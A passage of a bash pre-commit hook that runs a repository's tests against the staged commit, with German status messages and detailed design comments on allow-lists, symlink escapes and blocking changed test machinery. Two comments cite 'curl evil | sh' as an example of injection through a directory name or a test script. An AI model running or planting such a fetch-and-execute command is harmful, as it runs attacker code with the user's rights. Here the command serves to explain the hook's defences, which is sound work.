#!/usr/bin/env bash
# run-tests.sh — run the repo's tests before the commit is written.
#
# Sorte C (Spec 2026-07-14): "the code runs, but does the wrong thing". No amount of READING
# proves this — only running does. Codex reads. Tests execute.
#
# COUNCIL 2026-07-14 (codex, qwen): running all 1090 test files on every commit is NOT safety —
# it is how a gate gets bypassed. People reach for --no-verify, disable the hook, or batch huge
# commits, and then NOTHING is checked. The sentence the owner accepted:
#   "Der lokale Commit ist nicht die letzte Sicherheitsgrenze. Der Merge ist sie."
# So the evidence is STAGED:
#   --scope commit (default) → only the tests related to the changed files. Seconds.
#   --scope push             → the whole unit suite (see pre-push.sh).
#   merge                    → everything, in CI, not bypassable. Not this hook's job.
#
# Reports on stdout, judges nothing:  {"status":"pass|fail|unavailable|skipped|not_applicable",
#                                      "detail":"…","dur":<seconds>}
# Exit is ALWAYS 0 — the caller decides what a result means.
#
# `unavailable`, never `fail`, when the tests COULD NOT run (no setup, services down, a hang).
# A dead docker must not look like broken code: a gate that cries wolf gets switched off.
set -uo pipefail
# shellcheck source=with-timeout.sh
. "$(dirname "$0")/with-timeout.sh"

# Defined up here, not next to the test run: the workspace build below needs the same cap, and a
# hang there holds the commit just as hard as a hang in the tests.
CAP="${VETO_GATE_TEST_TIMEOUT:-1800}"     # 30 min
capped(){ with_timeout "$CAP" "$@"; }

START=$(date +%s)
# Set when workspace packages were tested through a link into the WORKING TREE instead of the
# staged state (see the node_modules section). The verdict then says so, every time: a result that
# is only mostly about this commit must not read like one that is entirely about it.
WSNOTE=""
out(){ # $1=status $2=detail
  jq -cn --arg s "$1" --arg d "$2$WSNOTE" --argjson u "$(( $(date +%s) - START ))" \
    '{status:$s,detail:$d,dur:$u}' 2>/dev/null \
    || printf '{"status":"unavailable","detail":"jq fehlt — nichts bewiesen","dur":0}'
  exit 0
}

# `shift 2` on a flag whose value is missing does NOT shift in bash — it fails, the loop never
# advances, and the hook HANGS forever holding the commit (codex). Every flag checks for its value.
REPO=""; SCOPE="commit"; FILES_IN=""; DELETED_IN=""; OVERLAY=0
while [ $# -gt 0 ]; do
  case "$1" in
    --repo)  [ $# -ge 2 ] || out unavailable "--repo ohne Wert aufgerufen — nichts gelaufen"
             REPO="$2"; shift 2;;
    --scope) [ $# -ge 2 ] || out unavailable "--scope ohne Wert aufgerufen — nichts gelaufen"
             SCOPE="$2"; shift 2;;
    # The caller may KNOW better than the index what this commit takes: `git add x && git commit`
    # runs before the add, and `git commit -a` stages the working tree afterwards. The gate has
    # already worked that out (add-paths.sh, -a detection) — so it hands over the file list, and
    # --overlay says: their WORKING-TREE content is what gets committed, not the index's (codex).
    --files)   [ $# -ge 2 ] || out unavailable "--files ohne Wert aufgerufen — nichts gelaufen"
               FILES_IN="$2"; shift 2;;
    # …and the files this commit REMOVES. They are absent from the +++ side of a diff, so the
    # overlay left them lying in the checkout and the tests ran against a world where the file
    # still existed — a deletion, untested (codex).
    --deleted) [ $# -ge 2 ] || out unavailable "--deleted ohne Wert aufgerufen — nichts gelaufen"
               DELETED_IN="$2"; shift 2;;
    --overlay) OVERLAY=1; shift;;
    *) shift;;
  esac
done
# A typo in --scope silently became "commit": the caller would believe the whole suite had run
# while only the narrow check did. A misunderstood order is not carried out quietly (codex).
case "$SCOPE" in
  commit|push) ;;
  *) out unavailable "unbekannter --scope '"'"'$SCOPE'"'"' — es lief NICHTS (erlaubt: commit, push)";;
esac
[ -d "$REPO" ] || out unavailable "Repo nicht gefunden"

# ── permission ────────────────────────────────────────────────────────────────
# Running a repo's tests EXECUTES CODE FROM THAT REPO on this machine, at commit time,
# automatically. A changed package.json can read, delete or send anything the user can.
#
# The permission lives where a hostile repo CANNOT REACH IT: a user-owned file outside every repo,
# listing the paths the user trusts. (An earlier design put the flag INSIDE the repo — a lock with
# the key on the inside.)
ALLOW="${VETO_GATE_TEST_ALLOWLIST:-$HOME/.claude/config/test-allowlist}"
RREAL=$(cd "$REPO" 2>/dev/null && pwd -P) || out unavailable "Repo nicht lesbar"
if [ ! -f "$ALLOW" ] || ! grep -qxF "$RREAL" "$ALLOW" 2>/dev/null; then
  # `unavailable`, NOT `skipped`: skipped means "deliberately not checked" and stays silent —
  # but here NOTHING was proven and the owner would never learn it. A missing permission is a
  # GAP, and gaps must be loud.
  # printf %q, never a raw path: a directory may legally be called "$(curl evil | sh)", and the
  # human who copies this line would run it. A helpful message must not be an execution vector.
  SAFE=$(printf '%q' "$RREAL" 2>/dev/null)  || SAFE="<Repo-Pfad>"
  SAFEL=$(printf '%q' "$ALLOW" 2>/dev/null) || SAFEL="<Freigabe-Datei>"
  out unavailable "nicht freigegeben — Tests liefen NICHT (würden fremden Projekt-Code ausführen). Freigeben: echo $SAFE >> $SAFEL"
fi

# Trusting the REPO is not the same as trusting THIS COMMIT. The allow-list says "I trust this
# project"; it cannot say "I trust the package.json that just arrived in the diff". Whoever
# changes the test script would otherwise get it executed automatically, with the user's rights,
# on the next commit. A real sandbox is a project of its own (owner decision) — so instead the
# EXECUTION path and the MODIFICATION path are kept apart: if this diff touches the test
# machinery, the tests do not run, it is reported as a gap, and a human looks at it.
#
# WHERE I DISAGREE WITH CODEX (deliberately, 2026-07-14). He asks for the same block on every
# changed TEST FILE, not just the machinery. He is right that a new *.test.ts is executable code
# with the user's rights — but that is true of every SOURCE file too: running a test executes the
# code it imports. Extending the guard to test files would therefore not close the hole; it would
# only make the tests never run during TDD, where every single commit changes a test. A protection
# that abolishes the feature protects nothing — the owner already ruled exactly this way on the
# sandbox question, and this is the same argument.
#
# The line I do hold is different in KIND: package.json (and the script it points at) is the
# command the GATE ITSELF invokes. "test:unit": "curl evil | sh" needs no test framework at all —
# it is a direct injection into an automated flow. That is what stays blocked. Everything beyond
# it is what the allow-list already authorises: "I trust this project's code to run on my machine
# when I commit." The honest answer to the rest is a sandbox, and it is a project, not a nested
# clause in this one.
# Checked against the index AND the caller's list: in `git add . && git commit` the index is still
# empty of everything, so an index-only check would have missed a package.json arriving in that very
# chain — and then executed it.
#
# The Python side of the same line: pyproject.toml carries the options pytest runs under, and
# conftest.py is arbitrary code pytest EXECUTES at collection — before a single test is chosen.
# Both are the command the gate itself invokes, exactly like package.json. requirements files and
# the pytest/tox/setup config decide what gets imported at all.
MACHINERY='(^|/)package\.json$|(^|/)package-lock\.json$|(^|/)jest\.[^/]*\.?c?js$|(^|/)vitest\.config|(^|/)hooks/tests/|(^|/)test/[^/]*setup|(^|/)\.npmrc$|(^|/)pyproject\.toml$|(^|/)pytest\.ini$|(^|/)tox\.ini$|(^|/)setup\.cfg$|(^|/)conftest\.py$|(^|/)requirements[^/]*\.txt$'
TOUCHES=$( { git -C "$REPO" diff --cached --name-only 2>/dev/null; printf '%s\n' "${FILES_IN:-}"; } \
  | grep -v '^$' | grep -cE "$MACHINERY" || true)
case "$TOUCHES" in ''|*[!0-9]*) TOUCHES=0;; esac
if [ "$TOUCHES" -gt 0 ]; then
  out unavailable "dieser Commit ändert die Test-Maschinerie (package.json / Test-Konfiguration) — die Tests laufen NICHT automatisch. Von Hand ansehen und starten."
fi

# ── what gets tested: the STAGED state ───────────────────────────────────────
# Testing the working tree means an uncommitted fix can make the tests green while the STAGED code
# is broken — the gate would certify a commit that was never tested. Every git question is asked
# BEFORE the checkout: the temp tree is not a git repo and would quietly answer nothing.
# Which JS/TS files does this commit change? Read from the REAL repo, BEFORE the checkout: the
# temp tree is not a git repo, `git diff --cached` there returns nothing, and --findRelatedTests
# would then quietly test NOTHING while reporting success.
JSTS='\.(ts|tsx|mts|cts|js|jsx|mjs|cjs)$'      # .mts/.cts are TypeScript too (codex)
# EVERY changed file goes to the selection, not just the JS/TS ones. jest resolves whatever is in
# the module graph — a .json fixture, a .css, a .sql migration all reach the tests that import
# them. Filtering to JS/TS first meant a commit that changed only those files was reported
# `not_applicable` and went through in SILENCE (codex).
#
# NOTHING is filtered out — not even markdown (codex): an .md can be product content (MDX, a docs
# site) or test data, and a test that imports it must run. Whether a file matters is decided by the
# module graph, not by its extension. Docs stay quiet a different way: see the empty-list case below.
if [ -n "$FILES_IN" ]; then
  CHANGED_FILES=$(printf '%s\n' "$FILES_IN" | grep -v '^$')
else
  CHANGED_FILES=$(git -C "$REPO" diff --cached --name-only --diff-filter=ACMR 2>/dev/null)
fi
# A DELETED file breaks whoever imported it — and --findRelatedTests cannot look for the tests of
# a file that is gone. Reporting "nothing to test" there is the silent pass this plan exists to
# kill (codex): a deletion widens the run to the whole unit suite.
# A DELETION or RENAME of ANY non-doc file widens the run to the whole suite. --findRelatedTests
# cannot be pointed at a file that is gone, and the file is gone for everyone who imported it —
# a .json, a .css or a .sql just as much as a .ts (codex). Judged by BOTH names of a rename, since
# `alt.ts -> neu.txt` has no TypeScript name on the new side while every importer stays broken.
DELETED=$( { git -C "$REPO" diff --cached --name-status -M 2>/dev/null \
               | awk '$1 ~ /^[DR]/ { for (i = 2; i <= NF; i++) print $i }'
             printf '%s\n' "${DELETED_IN:-}"; } | grep -c . || true)
case "$DELETED" in ''|*[!0-9]*) DELETED=0;; esac

STAGE=$(mktemp -d -t veto-stage) || out unavailable "kein Temp-Ordner — Tests liefen NICHT"
trap 'rm -rf "$STAGE" 2>/dev/null' EXIT
if ! git -C "$REPO" checkout-index -a -f --prefix="$STAGE/" 2>/dev/null; then
  out unavailable "Staging-Bereich nicht auscheckbar — Tests liefen NICHT (der Arbeitsbaum wäre nicht das, was committet wird)"
fi
# node_modules is not in the index — it gets linked in below, after the overlay, or nothing runs
# at all. Not here: inside_stage is not defined yet, and a link laid before the overlay could be
# the very parent the overlay then writes through — straight out of the sandbox.
SRC="$REPO"          # the real repo — for git questions
# `git add x && git commit` runs BEFORE the add, and `git commit -a` stages afterwards: for those
# files the index holds the OLD content, and testing it would prove nothing about the commit. The
# caller names them, and their working-tree content — the content that will be committed — is laid
# over the checkout (codex).
# A path whose PARENT inside the temp tree is a symlink would make cp and rm write straight through
# it — outside the sandbox, into whatever the link points at (codex). The index of a hostile repo may
# contain exactly such a link, and checkout-index creates it faithfully. So every component of every
# overlay path is checked, and the run is abandoned rather than made to write somewhere unknown.
inside_stage(){   # $1 = repo-relative path — false if any PARENT component is a symlink
  local rel="$1" acc="$STAGE" comp oldifs n i
  # Absolute paths only. ".." is judged per COMPONENT below, never as letters inside a name: "a..ts"
  # is a perfectly legal file, and rejecting it switched the tests off for that commit (codex).
  case "$rel" in /*) return 1;; esac
  oldifs="$IFS"; IFS='/'
  set -f                                   # a filename may contain * or ? — splitting it must NOT
  # glob, or the components come out wrong, a symlinked parent is missed, and the write escapes the
  # tree after all. My own guard, walked around by a filename (codex).
  set -- $rel
  set +f; IFS="$oldifs"
  n=$#; i=0
  for comp in "$@"; do
    i=$((i + 1))
    [ -n "$comp" ] || continue
    # ".." only counts as a path component, never as letters inside a name: "a..ts" is a perfectly
    # legal file, and rejecting it switched the tests off for that commit (codex).
    case "$comp" in ..|.) return 1;; esac
    # ONLY the last component is exempt (it may be a link: it gets removed, never followed).
    # Comparing by NAME instead of position skipped the parent in 'raus/raus' — a symlinked
    # directory with the same name as the file inside it, and the delete went straight through
    # it, out of the tree (codex).
    [ "$i" = "$n" ] && continue
    acc="$acc/$comp"
    [ -L "$acc" ] && return 1
  done
  return 0
}

# Deletions FIRST, then the copies. A commit may replace a FILE named `dir` with a DIRECTORY
# `dir/a.ts` — copy first and mkdir fails against the old file, the error is swallowed, and the tests
# run on a tree that is neither the old state nor the new one (codex). Every mkdir, rm and cp is
# checked: a silently half-built tree is exactly the kind of evidence this whole plan refuses.
if [ "$OVERLAY" = 1 ] && [ -n "${DELETED_IN:-}" ]; then
  while IFS= read -r f; do
    [ -n "$f" ] || continue
    inside_stage "$f" || out unavailable "Pfad führt im Testbaum über einen Symlink ($f) — Tests liefen NICHT"
    rm -rf "$STAGE/$f" || out unavailable "Testbaum nicht sauber herstellbar ($f) — Tests liefen NICHT"
  done <<EOF_DEL
$DELETED_IN
EOF_DEL
fi

if [ "$OVERLAY" = 1 ] && [ -n "$CHANGED_FILES" ]; then
  while IFS= read -r f; do
    [ -n "$f" ] || continue
    [ -e "$SRC/$f" ] || [ -L "$SRC/$f" ] || continue
    inside_stage "$f" || out unavailable "Pfad führt im Testbaum über einen Symlink ($f) — Tests liefen NICHT, es wäre außerhalb geschrieben worden"
    rm -rf "$STAGE/$f" || out unavailable "Testbaum nicht sauber herstellbar ($f) — Tests liefen NICHT"
    mkdir -p "$STAGE/$(dirname "$f")" || out unavailable "Testbaum nicht sauber herstellbar ($f) — Tests liefen NICHT"
    # -P: a commit that adds a SYMLINK stores the link, not the file it points at. Following it here
    # would test something the commit never contained (codex).
    cp -P "$SRC/$f" "$STAGE/$f" || out unavailable "Datei nicht in den Testbaum übernehmbar ($f) — Tests liefen NICHT"
  done <<EOF_OV
$CHANGED_FILES
EOF_OV
fi

# ── node_modules: EVERY workspace's, not just the root one ────────────────────
# node_modules is not in the index, so the checkout has none — they are linked in from the real
# repo. Linking ONLY the root one was a monorepo hole: npm keeps a workspace's own dependencies
# under <workspace>/node_modules, and a generated client (a prisma driver) is written there too.
# Its absence does not fail a test — it fails the whole SUITE before the first test runs
# ("Cannot find module '.prisma/lite-client'"), and the gate reported that as "Tests rot" on every
# commit touching that workspace. Measured on beispiel-repo, same commit and same command: 0 tests in
# the temp tree against 91 green in the real repo.
#
# -prune keeps the walk out of the node_modules themselves (their contents are huge and
# irrelevant) and out of .git, so a nested workspace is found at ANY depth — no guessed maxdepth.
# `-type l` belongs next to `-type d`: the old `[ -d ]` test followed a symlink, and a repo whose
# node_modules IS one (pnpm) must not silently lose its dependencies to this rewrite.
# $RREAL, not $SRC: the link target must be absolute, and RREAL is the caller's --repo already
# resolved with `pwd -P`. A relative target would point at nothing from inside the temp tree.
#
# npm workspaces put symlinks INSIDE node_modules that point back at the repo
# (node_modules/@scope/core -> ../../packages/core; 19 of them in beispiel-repo). Through them a test
# reads the WORKING TREE, not the staged state, and an unstaged fix in a linked package turns a
# test green. That hole came with the very first root-node_modules link and is older than this
# section — but "older" is not "harmless": it is the staged-state promise, quietly broken.
#
# Closing that needs the packages INSTALLED and BUILT inside the temp tree — and both are things
# the project knows how to do and this gate does not (which install flags, which build, whether a
# client has to be generated first). So it does not guess. VETO_GATE_WORKSPACE_SETUP carries the
# project's own command; the gate only runs it, in the temp tree:
#
#   set   -> that command prepares the tree (npm install writes the workspace links RELATIVE, so
#            they resolve inside the tree by themselves) and the tests see only this commit.
#            None of the linking below happens — there is nothing left to link.
#   unset -> the cheap behaviour above, unchanged, and the verdict SAYS how many linked packages
#            came from the working tree. A repo whose setup this gate does not know must never be
#            handed a tree with no build output and told its tests are red — that is this file's
#            own disease, self-inflicted.
#
# Opt-in because it costs: measured on beispiel-repo, 4s without against ~30s with (install 23s,
# generate + build 6s). That is a real price, and the project pays it only if it wants to.
#
# The walk gets its OWN short cap, and its exit status is CHECKED. Both matter, and both are this
# same bug wearing a different hat: a find that stalls on a dead network mount would hold the
# commit open with no way out, and a find that fails part-way returns an INCOMPLETE list — the
# links then silently go missing again and the suite comes back "rot" for no visible reason. A
# missing link cannot be detected afterwards, so neither failure is swallowed here.
WSSETUP="${VETO_GATE_WORKSPACE_SETUP:-}"

FIND_CAP="${VETO_GATE_FIND_TIMEOUT:-60}"
# -print0 and `read -r -d ''`: a directory name may legally contain a NEWLINE, and splitting the
# list on newlines would hand mkdir and ln two halves of one name — dependencies missing, or a
# write somewhere nobody meant. NUL is the one byte a path cannot contain. It cannot live in a
# shell variable either, so the list travels through a file.
# -mindepth 1, and the whole expression PARENTHESISED: a repo that is ITSELF called node_modules
# otherwise matches at depth 0 and is pruned on the spot — the walk ends before it starts and
# every workspace goes missing. The brackets are not decoration: on BSD find (macOS) -mindepth is
# a primary, not a global option, so without them it would bind to the first branch only.
NMLIST=$(mktemp -t veto-nm) || out unavailable "kein Temp-Ordner für die node_modules-Liste — Tests liefen NICHT"
trap 'rm -rf "$STAGE" 2>/dev/null; rm -f "$NMLIST" 2>/dev/null' EXIT

if [ -n "$WSSETUP" ]; then
  # The whole section below is skipped: the project's own command installs into the temp tree, and
  # npm writes the workspace links RELATIVE (@scope/core -> ../../packages/core), so they resolve
  # inside the tree by themselves. Nothing to link, nothing to bend, no layout rebuilt by hand.
  #
  # An earlier attempt did rebuild it — mirroring all 1713 entries, bending the workspace ones.
  # Four review rounds each found another case it had to know about (scopes, dotfiles, links to
  # files, names with newlines) and the diff quadrupled. That is the tell: reimplementing what
  # npm already does correctly. The command below is one line and knows all of it.
  # This command runs project code from the commit, exactly as `npm run test:unit` does a few
  # lines further down — an npm script it invokes comes from the STAGED package.json. It is the
  # same trust and the same limit, already settled above: the allow-list says "I trust this
  # project's code to run on my machine when I commit", the machinery guard keeps a changed
  # package.json out of that path, and everything beyond it is the sandbox question, which is a
  # project of its own and not a nested clause in this one.
  ( cd "$STAGE" && capped sh -c "$WSSETUP" ) >/dev/null 2>&1
  SRC_RC=$?
  # A setup that dies is a GAP, never a red test: broken tooling must not read as broken code.
  if [ "$SRC_RC" -ge 124 ]; then
    out unavailable "Vorbereitung des Testbaums brauchte zu lange — Tests liefen NICHT"
  elif [ "$SRC_RC" -ne 0 ]; then
    out unavailable "Vorbereitung des Testbaums fehlgeschlagen — Tests liefen NICHT (VETO_GATE_WORKSPACE_SETUP prüfen)"
  fi
else
with_timeout "$FIND_CAP" find "$RREAL" -mindepth 1 \
  \( -name .git -prune -o -name node_modules \( -type d -o -type l \) -print0 -prune \) \
  > "$NMLIST" 2>/dev/null
FIND_RC=$?
if [ "$FIND_RC" -ge 124 ]; then
  out unavailable "Suche nach node_modules brauchte länger als ${FIND_CAP}s — Tests liefen NICHT"
elif [ "$FIND_RC" -ne 0 ]; then
  out unavailable "node_modules nicht vollständig auffindbar — Tests liefen NICHT (eine unvollständige Liste wäre ein Fehlalarm)"
fi
# Read from the file — NOT piped into the loop. A pipe runs the loop in a SUBSHELL, where `out`'s
# exit ends only that subshell and the script walks on as if the link had succeeded: the silent
# pass this whole file exists to prevent.
while IFS= read -r -d '' nm; do
  [ -n "$nm" ] || continue
  rel="${nm#"$RREAL"}"; rel="${rel#/}"
  [ -n "$rel" ] || continue
  inside_stage "$rel" || out unavailable "Pfad führt im Testbaum über einen Symlink ($rel) — Tests liefen NICHT"
  # The commit itself may carry something at that path (node_modules is normally ignored, but a
  # repo can force-add it). What the commit brings wins — it is the state under test.
  if [ -e "$STAGE/$rel" ] || [ -L "$STAGE/$rel" ]; then continue; fi
  # The parent by shell splitting, NEVER $(dirname): command substitution strips trailing
  # newlines, and a directory name may END in one — the parent would come out as a different,
  # invented path and a stray directory would appear in the tree.
  parent="${rel%/*}"
  [ "$parent" = "$rel" ] && parent=""     # no slash at all: this is the root node_modules
  # The tree under test is the STAGED state, and nothing else may be added to it. A workspace npm
  # has installed but the commit does not contain has no parent here — and creating one would put
  # a whole workspace into the tree that the commit never writes, so the tests would answer about
  # a state that does not exist. No such directory, nothing to link: the commit has no code there.
  [ -z "$parent" ] || [ -d "$STAGE/$parent" ] || continue
  ln -s "$nm" "$STAGE/$rel" || out unavailable "node_modules nicht verlinkbar ($rel) — Tests liefen NICHT"
done < "$NMLIST"

# Those links point at the real repo, so a workspace package behind one of them is the WORKING
# TREE. Say so in the verdict — every time, not just on a red one: a green that partly describes
# the working tree, reported as if it described the commit, is the quiet half-truth this file
# exists to prevent.
#
# Asked of the manifest, not by searching node_modules. An earlier version walked the tree to name
# the exact packages, and three review rounds went into ITS edge cases (unreachable directories,
# a node_modules that is itself a symlink, a repo living in a directory of that name) — all of it
# machinery for a WARNING, which only has to be honest, not precise. `workspaces` in package.json
# is what makes npm link them in the first place; a project that has it has them.
# It follows that a workspace layout npm does not define this way (a pnpm-workspace.yaml) goes
# unwarned. Stated, not fixed: the alternative is the search that just cost three rounds.
  if jq -e '.workspaces' "$STAGE/package.json" >/dev/null 2>&1; then
    WSNOTE=" — ACHTUNG: verlinkte Arbeitsbereich-Pakete wurden aus dem ARBEITSBAUM gelesen, nicht aus dem vorgemerkten Stand. Zum Schließen: VETO_GATE_WORKSPACE_SETUP auf den Vorbereitungs-Befehl des Projekts setzen"
  fi
fi

REPO="$STAGE"        # from here on, "the repo" IS the state this commit will write

# The test SCRIPT may point at a file in the repo ("test:unit": "node scripts/test.js", or just
# "node test.js" in the root). Changing THAT file changes what gets executed just as much as
# changing package.json does, and the machinery guard above would not have seen it (codex).
#
# Read from the STAGED package.json — that is what this commit runs. Reading the working tree
# would let an unstaged edit hide the staged runner change (codex).
if [ -f "$REPO/package.json" ]; then
  RUNNER_SRC=$(jq -r '(.scripts["test:unit"] // "") + " " + (.scripts["test:integration"] // "")' \
               "$REPO/package.json" 2>/dev/null)
  # The caller's list belongs in here too: in `git add x && git commit` the index is still empty of
  # x, so an index-only check missed the changed starter script that the overlay then copied in and
  # executed (codex).
  STAGED_NAMES=$( { git -C "$SRC" diff --cached --name-only 2>/dev/null
                    printf '%s\n' "${FILES_IN:-}"; } | grep -v '^$' | sort -u)
  # What counts is the file that gets EXECUTED, not every file the command mentions: in
  # "grep -q GRUEN code.txt" the code.txt is data, and blocking on it would be a false alarm.
  # The executed file is the one right after an interpreter (`node test.js`, `bash scripts/test`
  # — no extension needed), or a script named outright (./run.sh). Quotes are stripped, because
  # `node "test.js"` is the same command (codex).
  PREV=""
  for w in $RUNNER_SRC; do
    w="${w%\"}"; w="${w#\"}"; w="${w%\'}"; w="${w#\'}"
    case "$w" in ''|-*) PREV="$w"; continue;; esac
    CAND=""
    # after an interpreter, the next word IS the executed file — `bash scripts/test` needs no
    # extension to be a script
    case "$PREV" in
      node|bash|sh|zsh|python|python3|ruby|perl|ts-node|tsx|deno|npx) CAND="$w";;
    esac
    # or it names a script outright: ./run, a path, a script extension, or an executable file
    case "$w" in *.js|*.mjs|*.cjs|*.ts|*.sh|./*|*/*) CAND="$w";; esac
    [ -z "$CAND" ] && [ -x "$REPO/${w#./}" ] && CAND="$w"
    PREV="$w"
    [ -n "$CAND" ] || continue
    CAND="${CAND#./}"
    if printf '%s\n' "$STAGED_NAMES" | grep -qxF "$CAND"; then
      out unavailable "dieser Commit ändert das Skript, das die Tests startet ($CAND) — sie laufen NICHT automatisch. Von Hand ansehen und starten."
    fi
  done

  # `cd scripts && ./test` — with shell syntax in the command, a relative path no longer means
  # what it says, and word-matching cannot decide it (codex). Rather than pretend: if this commit
  # changes an EXECUTABLE file and the test command steers with shell syntax, we do not run it.
  case "$RUNNER_SRC" in
    *"&&"*|*"||"*|*";"*|*"|"*|*"cd "*)
      while IFS= read -r f; do
        [ -n "$f" ] || continue
        if [ -x "$REPO/$f" ]; then
          out unavailable "das Test-Kommando benutzt Shell-Syntax und dieser Commit ändert eine ausführbare Datei ($f) — nicht sicher entscheidbar, die Tests laufen NICHT automatisch."
        fi
      done <<EOF_EX
$STAGED_NAMES
EOF_EX
      ;;
  esac
fi

# A HANGING test must not hold the commit forever. The owner chose "no time limit" over SLOW
# tests — but a hang is not slow, it is stuck. High but finite ceiling; a timeout is a GAP, not
# a failure: a hang proves nothing about the code.
# `timeout(1)` does not exist on macOS — perl alarm is the house pattern.

# Services the integration tests need. Overridable for tests.
PORTS="${VETO_GATE_TEST_PORTS:-5432 6379 4222}"
services_up(){
  local p dead=""
  for p in $PORTS; do
    lsof -nP -iTCP:"$p" -sTCP:LISTEN >/dev/null 2>&1 || dead="${dead}${p} "
  done
  [ -z "$dead" ] || { printf '%s' "$dead"; return 1; }
  return 0
}

has_script(){ jq -e --arg s "$1" '.scripts[$s] // empty' "$REPO/package.json" >/dev/null 2>&1; }

# The narrow selection runs the PROJECT'S OWN test command, with the project's own options —
# `npm run test:unit -- --findRelatedTests <dateien>`. Calling node_modules/.bin/jest directly
# would silently drop --config, --env, or any wrapper the project needs, and then the commit
# would test something OTHER than the push and CI do (codex). And it must never be `npx jest`:
# a vitest project would get a foreign jest fetched from the network and run against it.
#
# The command counts as jest only if its FIRST word is jest — a mere `grep jest` also matches a
# reporter name like jest-junit inside a vitest command (codex), and then we would start the
# wrong test program entirely.
uses_jest(){
  local cmd first w
  cmd=$(jq -r '.scripts["test:unit"] // ""' "$REPO/package.json" 2>/dev/null)
  case "$cmd" in *"&&"*|*"||"*|*";"*|*"|"*) return 1;; esac   # compound: appending args is unsafe
  first=""
  for w in $cmd; do
    case "$w" in *=*) continue;; esac                        # skip FOO=bar env prefixes
    first="$w"; break
  done
  case "$first" in
    jest|node_modules/.bin/jest|./node_modules/.bin/jest) ;;
    # `npx jest` counts ONLY with a local jest proven to be installed — otherwise npx fetches one
    # from the network, mid-commit. The first draft's comment forbade this and its code allowed it
    # (codex): a rule contradicted by the very code beneath it is not a rule.
    npx) set -- $cmd; shift; [ "${1:-}" = jest ] || return 1
         [ -x "$REPO/node_modules/.bin/jest" ] || return 1;;
    *) return 1;;
  esac
  return 0
}
run_npm(){    # 0 pass · 1 red · 124 timed out (perl alarm kills with SIGALRM → ≥124)
  ( cd "$REPO" && capped npm run --silent "$1" ) >/dev/null 2>&1
  rc=$?
  [ "$rc" -ge 124 ] && return 124
  return "$rc"
}

# ── JS/TS repo ────────────────────────────────────────────────────────────────
if [ -f "$REPO/package.json" ]; then
  if [ "$SCOPE" = "commit" ]; then
    has_script test:unit || out unavailable "kein test:unit im Repo"

    # A deletion cannot be handed to --findRelatedTests (the file is gone), and it is exactly when
    # the importers break. Widen to the whole suite instead of reporting nothing to do.
    if [ "$DELETED" -gt 0 ]; then
      run_npm test:unit; rc=$?
      [ "$rc" = 124 ] && out unavailable "Unit-Tests hingen (>${CAP}s abgebrochen) — nichts bewiesen"
      [ "$rc" = 0 ]   || out fail "Unit-Tests rot — der Commit enthält eine Löschung/Umbenennung, deshalb lief die ganze Suite"
      out pass "ganze Unit-Suite grün (Löschung/Umbenennung im Commit — eine gezielte Auswahl reicht dafür nicht)"
    fi

    [ -n "$CHANGED_FILES" ] || out not_applicable "nichts geändert, was ausgeführt werden könnte"
    uses_jest || out unavailable "test:unit ist kein reines jest-Kommando — die betroffenen Tests lassen sich nicht gezielt auswählen. Beim Push läuft die ganze Suite."

    # Only what THIS change touches. `jest --findRelatedTests` walks the real import graph — not a
    # guess. The file list goes in as REAL ARGUMENTS, one per parameter: a name with a space would
    # otherwise be split in two, and jest would test neither (codex).
    # Every path goes in AS A PATH: a file may legally be called "--config=evil.js", and jest would
    # read it as an option — starting test machinery that arrived with this very diff (codex).
    # A leading dash is disarmed with ./, which names the same file and can never be an option.
    set --
    while IFS= read -r f; do
      [ -n "$f" ] || continue
      case "$f" in -*) f="./$f";; esac
      set -- "$@" "$f"
    done <<EOF_CF
$CHANGED_FILES
EOF_CF

    # FIRST ask whether any test covers these files at all. The earlier draft passed
    # --passWithNoTests and reported `pass` on exit 0 — so a change that NO test covers came back
    # green. A fake green is worse than a red: it is the exact disease this whole plan treats
    # (codex). No covering test is a GAP, and it is worth knowing.
    LIST=$( cd "$REPO" && capped npm run --silent test:unit -- --listTests --findRelatedTests "$@" 2>/dev/null )
    rc=$?
    [ "$rc" -ge 124 ] && out unavailable "die Testauswahl hing (>${CAP}s abgebrochen) — nichts bewiesen"
    [ "$rc" = 0 ]     || out unavailable "die Testauswahl lief nicht (jest nicht startbar?) — nichts bewiesen"
    # No test covers these files. For a code change that is a GAP worth hearing about. For a pure
    # documentation commit it is simply the normal state — and an alarm for a normal state is how
    # people stop reading alarms (council). The module graph decides, the extension only speaks when
    # the graph has said nothing.
    if [ -z "$LIST" ]; then
      if printf '%s\n' "$CHANGED_FILES" | grep -qvE '\.md$'; then
        out unavailable "KEIN Test deckt die geänderten Dateien ab — diese Änderung ist ungeprüft"
      fi
      out not_applicable "reiner Doku-Commit, von keinem Test berührt — es gibt nichts auszuführen"
    fi

    ( cd "$REPO" && capped npm run --silent test:unit -- --findRelatedTests "$@" ) >/dev/null 2>&1
    rc=$?
    [ "$rc" -ge 124 ] && out unavailable "Tests hingen (>${CAP}s abgebrochen) — nichts bewiesen"
    [ "$rc" = 0 ]     || out fail "Tests der geänderten Dateien sind rot"
    NT=$(printf '%s\n' "$LIST" | grep -c '[^[:space:]]')
    out pass "$NT Test-Datei(en) der geänderten Dateien grün"
  fi

  # --scope push: the whole unit suite. Integration only if its services are actually up.
  RAN=""
  if has_script test:unit; then
    run_npm test:unit; rc=$?
    [ "$rc" = 124 ] && out unavailable "Unit-Tests hingen (>${CAP}s abgebrochen) — nichts bewiesen"
    [ "$rc" = 0 ]   || out fail "Unit-Tests rot (npm run test:unit)"
    RAN="Unit"
  fi
  if has_script test:integration; then
    if DEAD=$(services_up); then
      run_npm test:integration; rc=$?
      [ "$rc" = 124 ] && out unavailable "Integration-Tests hingen (>${CAP}s abgebrochen) — nichts bewiesen"
      [ "$rc" = 0 ]   || out fail "Integration-Tests rot (npm run test:integration)"
      RAN="${RAN:+$RAN + }Integration"
    else
      out unavailable "Dienste aus (Port $DEAD) — Integration-Tests nicht lauffähig, nichts bewiesen"
    fi
  fi
  [ -n "$RAN" ] || out unavailable "kein test:unit/test:integration im Repo"
  out pass "$RAN-Tests grün"
fi

# ── bash repo (our own config) ────────────────────────────────────────────────
# A bash suite has no import graph, so there is no way to select "the tests of the changed files".
# Running ALL of them on every commit is exactly the minutes-per-commit that the council said would
# get the gate switched off. So they run at PUSH (pre-push.sh), and the commit says so out loud
# rather than pretending: `skipped` means deliberately deferred, not overlooked.
if [ -d "$REPO/hooks/tests" ] && [ "$SCOPE" = "commit" ]; then
  out skipped "bash-Repo: keine gezielte Auswahl möglich — die Suiten laufen beim Push (pre-push)"
fi
if [ -d "$REPO/hooks/tests" ]; then
  BAD=""; N=0; HUNG=""
